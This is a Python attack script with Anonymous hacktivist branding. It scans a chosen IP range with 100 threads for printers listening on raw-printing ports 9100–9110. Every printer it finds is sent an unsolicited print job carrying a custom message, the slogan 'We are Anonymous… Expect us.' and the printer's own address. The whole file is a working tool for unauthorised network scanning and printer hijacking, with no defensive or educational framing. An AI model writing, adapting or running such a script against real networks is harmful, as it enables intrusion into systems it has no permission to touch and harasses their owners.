import socket
import threading
from queue import Queue
from tqdm import tqdm
import pyfiglet
from colorama import Fore, Style, init

# Initialize colorama (auto-reset colors)
init(autoreset=True)

# === Configuration ===
PORTS = list(range(9100, 9111))  # Printer ports 9100–9110
TIMEOUT = 1
MAX_THREADS = 100

# === Global variables ===
task_queue = Queue()
send_queue = Queue()
printers_found = {}
lock = threading.Lock()
progress_lock = threading.Lock()
scanned_count = 0

# === Colors ===
HEADER_COLOR = Fore.MAGENTA + Style.BRIGHT
SCAN_COLOR = Fore.YELLOW
SUCCESS_COLOR = Fore.GREEN
ERROR_COLOR = Fore.RED
INFO_COLOR = Fore.CYAN
RESET = Style.RESET_ALL


def print_banner():
    banner = pyfiglet.figlet_format("V1p3rC0d3 | Anonymous", font="slant")
    print(f"{HEADER_COLOR}{banner}{RESET}")


def scan_ip(ip):
    global scanned_count
    open_ports = []

    for port in PORTS:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(TIMEOUT)
                if sock.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
        except Exception:
            pass

    if open_ports:
        with lock:
            printers_found[ip] = open_ports
            print(f"{SUCCESS_COLOR}✅ {ip} → open ports: {open_ports}{RESET}")
            for port in open_ports:
                send_queue.put((ip, port))

    with progress_lock:
        scanned_count += 1


def worker():
    while not task_queue.empty():
        ip = task_queue.get()
        scan_ip(ip)
        task_queue.task_done()


def send_print(ip, port, message):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(2)
            sock.connect((ip, port))
            payload = (
                f"\n{message}\n"
                "----------------------------\n"
                "𝕎𝕖 𝕒𝕣𝕖 𝔸𝕟𝕠𝕟𝕪𝕞𝕠𝕦𝕤. 𝕎𝕖 𝕒𝕣𝕖 𝕝𝕖𝕘𝕚𝕠𝕟.\n"
                "𝕎𝕖 𝕕𝕠 𝕟𝕠𝕥 𝔣𝕠𝕣𝕘𝕚𝕧𝕖. 𝕎𝕖 𝕕𝕠 𝕟𝕠𝕥 𝕗𝕠𝕣𝕘𝕖𝕥.\n"
                "𝔼𝕩𝕡𝕖𝕔𝕥 𝕦𝕤.\n"
                f"{ip}:{port}\n"
                "----------------------------\n"
            )
            sock.sendall(payload.encode("utf-8"))
            print(f"{INFO_COLOR}🖨️  Sent to {ip}:{port}{RESET}")
    except Exception as e:
        print(f"{ERROR_COLOR}❌ Error on {ip}:{port} → {e}{RESET}")


def main():
    global scanned_count

    print_banner()

    print(f"{HEADER_COLOR}📡 Network Printer Scanner (Ports 9100–9110){RESET}")
    prefix = input(f"{SCAN_COLOR}Network prefix (e.g., 192.168.1): {RESET}").strip()
    start = int(input(f"{SCAN_COLOR}Start IP (e.g., 1): {RESET}"))
    end = int(input(f"{SCAN_COLOR}End IP (e.g., 254): {RESET}"))
    message = input(f"{SCAN_COLOR}Message to print: {RESET}")

    # Populate scanning queue
    for i in range(start, end + 1):
        task_queue.put(f"{prefix}.{i}")

    print(f"\n{INFO_COLOR}🧵 Starting scan with {MAX_THREADS} threads...\n{RESET}")

    # Start scanning threads
    for _ in range(MAX_THREADS):
        threading.Thread(target=worker, daemon=True).start()

    # Progress bar for scanning
    with tqdm(total=task_queue.qsize(), desc=f"{SCAN_COLOR}Scanning IPs{RESET}") as pbar:
        last_count = 0
        while scanned_count < task_queue.qsize():
            with progress_lock:
                diff = scanned_count - last_count
                last_count = scanned_count
            pbar.update(diff)
            threading.Event().wait(0.1)

    task_queue.join()

    if printers_found:
        print(f"\n{INFO_COLOR}🚀 Sending print jobs to {len(printers_found)} printers...\n{RESET}")
        while not send_queue.empty():
            ip, port = send_queue.get()
            send_print(ip, port, message)
            send_queue.task_done()
    else:
        print(f"{ERROR_COLOR}\n⚠️ No printers found.{RESET}")


if __name__ == "__main__":
    main()
